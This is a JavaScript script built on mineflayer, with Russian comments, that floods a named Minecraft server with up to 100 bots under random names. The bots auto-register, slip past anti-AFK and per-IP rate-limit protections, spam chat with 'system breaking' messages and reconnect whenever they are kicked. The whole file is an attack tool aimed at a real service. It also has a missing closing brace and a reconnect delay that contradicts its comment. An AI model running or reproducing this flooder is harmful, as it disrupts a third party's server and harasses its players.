const mineflayer = require('mineflayer');

// Конфигурация цели
const TARGET_HOST = 'mc.mineblaze.ru';
const PASS = 'iamsuck12345';
const MAX_BOTS = 100; // Увеличил количество для большего веса атаки

// Генератор мусорных ников (полный хаос: jrghdfjjg3458gjf)
function generateTrashNick() {
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    let length = Math.floor(Math.random() * (16 - 10 + 1)) + 10; 
    let nick = '';
    for (let i = 0; i < length; i++) {
        nick += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return nick;
}

function createKillerBot(id) {
    const username = generateTrashNick();
    
    const bot = mineflayer.createBot({
        host: TARGET_HOST,
        port: 25565,
        username: username,
        version: false, // Авто-определение версии сервера
        hideErrors: true
    });

    // 1. Вход и обход защиты (Регистрация + Авто-логин + /s4)
    bot.once('spawn', () => {
        console.log(`[+] Бот [${id}] зашел как: ${username}`);
        
        setTimeout(() => {
            bot.chat(`/reg ${PASS} ${PASS}`);
            bot.chat(`/login ${PASS}`);
            
            // Команда /s4 через паузу, чтобы сервер не откинул за скорость
            setTimeout(() => {
                bot.chat('/s4');
                console.log(`[!] Бот ${username} прожал /s4`);
            }, 2000);

            // Запуск модулей деструкции
            startHeavyAntiAfk(bot);
            startSmartSpam(bot);
        }, 4000);
    });

    // 2. Улучшенный обход Anti-AFK (Движение + Прыжки + Вращение)
    function startHeavyAntiAfk(bot) {
        setInterval(() => {
            if (!bot.entity) return;
            
            const actions = ['forward', 'back', 'left', 'right', 'jump'];
            const move = actions[Math.floor(Math.random() * actions.length)];
            
            bot.setControlState(move, true);
            // Рандомное вращение головой для обхода продвинутых защит
            bot.look(Math.random() * Math.PI * 2, (Math.random() - 0.5) * Math.PI);
            
            setTimeout(() => {
                bot.setControlState(move, false);
            }, 800);
        }, 3000);
    }

    // 3. Динамический спам на русском с уникальными ID
    function startSmartSpam(bot) {
        setInterval(() => {
            const randomHex = Math.random().toString(16).substring(2, 8);
            const phrases = [
                `Gothbreach Helper ломает систему [${randomHex}]`,
                `Сервер под нагрузкой... [${randomHex}]`,
                `RAGE MODE ACTIVE: ${randomHex}`,
                `Падаем? [${randomHex}]`
            ];
            bot.chat(phrases[Math.floor(Math.random() * phrases.length)]);
        }, 13000);
    }

   // 4. Защита от потери ботов (Исправленный авто-реконнект)
    bot.on('kicked', (reason) => {
        // Убираем JSON.parse, так как reason уже объект или строка
        let message = reason;
        
        // Если это сложный объект от Minecraft (extra/text), вытаскиваем текст
        if (typeof reason === 'object' && reason !== null) {
            message = reason.value || reason.text || JSON.stringify(reason);
        }

        console.log(`[-] Бот ${username} кикнут. Причина: ${message}. Реконнект через 10с...`);
        
        // Удаляем бота и создаем нового через 10 секунд
        setTimeout(() => createKillerBot(id), 10);
    });
// Постепенный запуск ботов ("лесенка") для обхода Rate Limit на IP
for (let i = 0; i < MAX_BOTS; i++) {
    setTimeout(() => {
        createKillerBot(i);
    }, i * 3500); 
}
